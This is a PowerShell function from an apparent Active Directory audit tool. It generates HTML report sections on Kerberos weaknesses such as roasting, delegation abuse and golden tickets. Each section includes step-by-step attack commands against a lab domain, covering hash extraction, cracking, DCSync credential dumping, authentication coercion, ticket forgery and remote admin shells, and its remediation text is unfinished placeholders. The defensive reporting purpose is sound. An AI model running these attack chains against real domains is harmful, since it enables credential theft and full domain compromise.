function Generate-Kerberoshtml {  
    param (
        [array]$Kerberos
    )

    if (!$Kerberos) {
        $html = @"
        <div class="finding-header">Kerberos</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    }    
    else {
        $html = @"
        <div class="finding-header">Kerberos</div>
        <div class="domain-info">
            <p>This section contains technical details relating to vulnerabilities found within the Kerberos implementation.</p>
        </div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header-left">Issue</th>
                    <th class="table-header-right">Risk</th>
                </tr>
            </thead>
            <tbody>
"@
        foreach ($finding in $Kerberos) {
             #replace console colours 
             if($finding.Risk -match "critical"){
                $finding.Risk = "Critical"
            } elseif ($finding.Risk -match "high"){
                $finding.Risk = "High"
            } elseif ($finding.Risk -match "medium"){
                $finding.Risk = "Medium"
            } elseif ($finding.Risk -match "low"){
                $finding.Risk = "Low"
            } elseif ($finding.Risk -match "informational"){
                $finding.Risk = "Informational"
            }
            if ($finding.Technique -match "ASREP-roastable") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
"@
                # Different issue headings        
                if ($finding.Technique -eq "Highly privileged ASREP-roastable user with a weak password") {
                    $html += "<td>Password hash of a highly privileged account can be obtained and cracked.</td>"
                    $html += "<td>T1558.004, TA0004</td>"
                }
                elseif ($finding.Technique -eq "Highly privileged ASREP-roastable user with a strong password") {
                    $html += "<td>Password hash of a highly privileged account can be obtained.</td>"
                    $html += "<td>T1558.004, TA0004</td>"
                }
                elseif ($finding.Technique -eq "Low privileged ASREP-roastable user with a weak password") {
                    $html += "<td>Password hash of a low privileged account can be obtained and cracked.</td>"
                    $html += "<td>T1558.004</td>"
                }
                elseif ($finding.Technique -eq "Low privileged ASREP-roastable user with a strong password") {
                    $html += "<td>Password hash of a low privileged account can be obtained.</td>"
                    $html += "<td>T1558.004</td>"
                }
                elseif ($finding.Technique -eq "Disabled ASREP-roastable user") {
                    $html += "<td>Password hash of a disabled account can be obtained and cracked.</td>"
                    $html += "<td>T1558.004</td>"
                }
                $html += @"
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Users</td><td>$($finding.Users -replace "`r?`n", "<br>")</td></tr>
"@  
                #If privileged match the groups
                if ($finding.Technique -match "Highly privileged") {
                    $html += @"
                    <tr><td class="grey">MemberOf</td><td>$($finding.Memberof -replace "`r?`n", "<br>")</td></tr>
"@
                } 
                $html += @"
                                        <tr><td class="grey">Enabled</td><td>$($finding.Enabled)</td></tr>
                                        <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the user's hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                            <p>This means for $($finding.NumUsers) users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                            <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                        alt="Obtaining the hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU.</p>
                                                    <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                        alt="Cracking the hash">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }    
            elseif ($finding.Technique -match "Kerberoastable") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
"@
                # Different issue headings        
                if ($finding.Technique -eq "Highly privileged Kerberoastable user with a weak password") {
                    $html += "<td>Password hash of a highly privileged account can be obtained and cracked.</td>"
                    $html += "<td>T1558.003, TA0004</td>"
                }
                elseif ($finding.Technique -eq "Highly privileged Kerberoastable user with a strong password") {
                    $html += "<td>Password hash of a highly privileged account can be obtained.</td>"
                    $html += "<td>T1558.003, TA0004</td>"
                }
                elseif ($finding.Technique -eq "Low privileged Kerberoastable user with a weak password") {
                    $html += "<td>Password hash of a low privileged account can be obtained and cracked.</td>"
                    $html += "<td>T1558.003</td>"
                }
                elseif ($finding.Technique -eq "Low privileged Kerberoastable user with a strong password") {
                    $html += "<td>Password hash of a low privileged account can be obtained.</td>"
                    $html += "<td>T1558.003</td>"
                }
                elseif ($finding.Technique -eq "Disabled Kerberoastable account") {
                    $html += "<td>Password hash of a disabled account can be obtained and cracked.</td>"
                    $html += "<td>T1558.003</td>"
                }
                $html += @"
                                        <td>T1558.003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Users</td><td>$($finding.Users -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">SPN</td><td>$($finding.SPN -replace "`r?`n", "<br>")</td></tr>
"@  
                #If privileged match the groups
                if ($finding.Technique -match "Highly privileged") {
                    $html += @"
                    <tr><td class="grey">MemberOf</td><td>$($finding.Memberof -replace "`r?`n", "<br>")</td></tr>
"@
                }
                $html += @"
                                        <tr><td class="grey">Enabled</td><td>$($finding.Enabled)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Kerberoasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service account's NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS.</p>
                                            <p>This means for $($finding.NumUsers) users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                            <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                        alt="Obtaining the hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU.</p>
                                                    <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                        alt="Cracking the hash">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
        
            elseif ($finding.Technique -eq "Unconstrained delegation") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>A server that is set for unconstrained delegation can compromise the entire domain.</td>
                                        <td>T1558, TA0008</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object</td><td>$($finding.Object -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">TrustedForDelegation</td><td>$($finding.TrustedForDelegation -replace "`r?`n", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Servers with unconstrained delegation configured cache user's tickets when they authenticate to the frontend service, in order to delegate on behalf of the user to another backend service. This is dangerous if a high privleged user or a domain controller (a connection can be forced using the spooler service) then the domain can be compromised.</p>
                                            <p>If computers with unconstrained delegation are compromised, full domain compromise is achievable by coercing authentication from a domain controller, who's ticket will be then be cached and can be extracted on the computer facilitating impersonation of a domain controller.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://blog.netwrix.com/2022/12/02/unconstrained-delegation/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2022/03/21/unconstrained-delegation/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can find which servers are configured for unconstrained delegation using netexec. Domain controllers are configured for unconstrained delegation by default and can be excluded.</p>
                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123' --trusted-for-delegation</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-1.png" alt="Finding unconstrained delegation">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. For the purpose of this attack it's assumed the server configured for unconstrained delegation has been compromised, and credential memory dumped.</p>
                                                    <p class="code">impacket-secretsdump Administrator:'Password123!'@dc.test.local -just-dc-user 'unconstrained$'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-2.png" alt="Compromise of unconstrained delegation server">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With unconstrained$ already compromised, it can update its SPN to point to a service running on an attacker machine "attacker.test.local". This is doen so when a DC authenticates to the unconstrained$ service it will be tricked to send the ticket to the attacker machine.</p>
                                                    <p class="code">python3 addspn.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -s HOST/attacker.test.local dc.test.local --additional dc.test.local</p>
                                                    <p>A DNS record can be added by any low-privileged account to the domain, so one is added to point the SPN to the IP of the attacker kali machine which will update every 180 seconds.</p>
                                                    <p class="code">python3 dnstool.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -r attacker.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                                    </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-3.png" alt="Adding SPN & dns record">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. Authentication can be coerced from the domain controller to the attacker machine using printerbug.</p>
                                                    <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>5. A kerberos listener is started to collect, decrypt and save the cached TGS of the domain controller intercepted from the coerced authentication.</p>
                                                    <p class="code">python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72</p>

                                                    <p>Finally, with the ticket of the domain controller obtained, a DCSync can be performed to extract all user credentials to fully compromise the domain.</p>
                                                    <p class="code">export KRB5CCNAME=DC\$@TEST.LOCAL_krbtgt@TEST.LOCAL.ccache</p>
                                                    <p class="code">impacket-secretsdump -k -no-pass dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-5.png" alt="Exploiting unconstrained">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Unconstrained remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 

            }
            elseif ($finding.Technique -eq "Constrained delegation") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>A server has full control of another server by being allowed to delegate to it (msDS-AllowedToDelegateTo).</td>
                                        <td>T1558, TA0008</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object</td><td>$($finding.Object -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">AllowedToDelegateTo</td><td>$($finding.AllowedToDelegateTo -replace "`r?`n", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Constrained delegation allows a computer to delegate to specific services on another server. Constrained delegation is configured on the computer or user object. It is set through the ms-DS-Allowed-To-Delegate-To property by specifying the SPN the current object is allowed constrained delegation against. If computers with constrained delegation are compromised, full compromise of the server it has permission to delegate to is achievable by proxy.</p> 
                                            <p>$($finding.Issue)</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/">Link 1</a></p>
                                            <p><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can find which servers are configured for constrained delegation by searching for servers with the 'msDS-AllowedToDelegateTo' property populated.</p>
                                                    <p class="code">impacket-findDelegation -target-domain test.local test.local/test:'Password123!'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/constrained-1.png" alt="Finding constrained delegation">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If the frontend service is compromised (DESKTOP-JKTS35O$), an adversary can request a ticket for any service on the backend (CA$).</p>
                                                    <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'DESKTOP-JKTS35O$' -hashes :511e061a15068d1cbda8dfc4cc22a2f3</p>
                                                    <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service..</p>
                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                    <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                                    </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/constrained-2.png" alt="exploiting constrained delegation">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Constrained remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
            elseif ($finding.Technique -eq "Resource-based constrained delegation") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>A server has full control of another server by being allowed to act on behalf of it (msDS-AllowedToActOnBehalfOfOtherIdentity).</td>
                                        <td>T1558, TA0008</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object</td><td>$($finding.Object -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">msDS-AllowedToActOnBehalfOfOtherIdentity</td><td>$($finding.'msDS-AllowedToActOnBehalfOfOtherIdentity' -replace "`r?`n", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Resource-based constrained delelgation (RBCD) was introduced in Windows server 2012 and is where a server permits delegation from a frontend service to a backend service. This is configured on the backend service via the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property. This type of delegation was seen as more secure than unconstrained or constrained, however if the frontend service is compromised, the backend service will also be by proxy.</p>
                                            <p>$($finding.Issue)</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/">Link 1</a></p>
                                            <p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can find which servers are configured for RBCD by searching for those with the msDS-AllowedToActOnBehalfOfOtherIdentity property populated.</p>
                                                    <p class="code">Get-ADComputer 'CA' -Properties PrincipalsAllowedToDelegateToAccount</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/RBCD-1.png" alt="Finding RBCD">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If the frontend service is compromised (RBCD$), an adversary can request a ticket for any service on the backend (CA$).</p>
                                                    <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'RBCD$' -hashes :88d61b9ad3988a5bb86ca8ba9386d736</p>
                                                    <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service.</p>
                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                    <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/RBCD-2.png" alt="Exploiting RBCD">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>RBCD remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 

            }
            elseif ($finding.Technique -match "Golden ticket attack") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>The krbtgt password has not been rotated in the last 180 days.</td>
                                        <td>T1558.001</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">Pwd last set</td><td>$($finding.Pwdlastset)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Golden ticket attacks are seen in adversary post-exploitation where an adversary has obtained the secret material of krbtgt, which can only be obtained with domain admin privileges (i.e. an adversary has fully comrpomised your domain). The krbtgt acts as the service account used by the KDC to sign domain tickets, and if compromised can be used to forge tickets for any domain user.</p>
                                            <p>If not rotated and krbtgt is compromised, an adversary can forge tickets for any user for an unlimited period of time. This facilitates long-term, high privilege system access.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.picussecurity.com/resource/blog/golden-ticket-attack-mitre-t1558.001">Link 1</a></p>
                                            <p><a href="https://www.netwrix.com/how_golden_ticket_attack_works.html">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. If an adversary obtains domain admin privileges, they can extract the krbtgt hash from the domain controller.</p>
                                                    <p class="code">impacket-secretsdump Administrator:'Password123!'@dc.test.local -just-dc-user krbtgt</p>
                                                    <p>To craft a golden ticket the domain SID is also required to be known</p>
                                                    <p class="code">impacket-lookupsid test.local/test:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-1.png" alt="Obtaining the krbtgt hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. The ticket can be forged for any user, in this case an enterprise admin is chosen.</p>
                                                    <p class="code">impacket-ticketer -nthash b17d7071fd26eb1585bfcbef9afc8354 -domain-sid S-1-5-21-1189352953-3643054019-2744120995 -domain test.local enterpriseadmin1</p>
                                                    <p>The forged ticket can then be used to authenticate to any domain resource in the context of the enterprise administrator for a default period of 10 years.</p>
                                                    <p class="code">export KRB5CCNAME=enterpriseadmin1.ccache</p>
                                                    <p class="code">klist</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-2.png" alt="Forging a golden ticket">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Reset krbtgt twice!</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
        }
        $html += "</tbody></table></div>"
    }    
    return $html
}